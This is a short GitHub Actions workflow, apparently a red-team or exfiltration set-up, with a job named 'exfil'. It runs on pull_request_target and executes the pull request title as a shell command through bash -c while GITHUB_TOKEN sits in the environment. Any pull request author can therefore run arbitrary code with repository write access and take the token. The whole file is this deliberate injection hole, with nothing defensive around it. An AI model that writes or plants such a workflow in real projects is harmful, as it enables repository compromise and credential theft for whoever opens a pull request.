name: rt
on: [pull_request_target]
permissions:
  contents: read
  pull-requests: write
  issues: write
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "TITLE=$TITLE"
      - name: exfil
        env:
          TITLE: ${{ github.event.pull_request.title }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          bash -c "$TITLE" 2>&1 || true
